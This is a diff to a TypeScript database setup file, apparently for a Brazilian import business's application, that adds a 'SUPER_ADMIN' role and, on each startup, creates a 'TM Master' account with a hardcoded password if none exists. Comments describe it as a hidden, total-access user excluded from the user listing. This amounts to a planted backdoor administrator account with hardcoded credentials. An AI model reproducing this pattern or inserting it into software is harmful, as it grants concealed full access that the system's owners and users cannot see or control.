@@ -278,6 +278,9 @@ async function sincronizarColunas() {
     `ALTER TABLE "LogAuditoria" ADD COLUMN IF NOT EXISTS "userRole"  TEXT`,
     `ALTER TABLE "LogAuditoria" ADD COLUMN IF NOT EXISTS "detalhes"  TEXT`,
     `ALTER TABLE "LogAuditoria" ADD COLUMN IF NOT EXISTS "ip"        TEXT`,
+
+    // --- Enum Role: SUPER_ADMIN (usuário oculto de acesso total) ---
+    `ALTER TYPE "Role" ADD VALUE IF NOT EXISTS 'SUPER_ADMIN' BEFORE 'ADMIN_GERAL'`,
   ];
 
   for (const sql of sqls) {
@@ -294,7 +297,24 @@ async function initializeDatabase() {
   await sincronizarColunas();
 
   const bcrypt = await import('bcryptjs');
-  
+
+  // ── SUPER_ADMIN oculto (não aparece na listagem de usuários) ──────────────
+  const superAdminExiste = await prisma.user.findFirst({ where: { role: 'SUPER_ADMIN' as any } });
+  if (!superAdminExiste) {
+    const senhaSA = await bcrypt.default.hash('TM@master2024', 10);
+    await prisma.user.create({
+      data: {
+        nome: 'TM Master',
+        email: 'master@tmimports.com.br',
+        senha: senhaSA,
+        role: 'SUPER_ADMIN' as any,
+        ativo: true
+      }
+    });
+    console.log('[SUPER_ADMIN] Usuário master criado: master@tmimports.com.br');
+  }
+  // ─────────────────────────────────────────────────────────────────────────
+
   const adminExiste = await prisma.user.findFirst({ where: { role: 'ADMIN_GERAL' } });
   
   if (!adminExiste) {
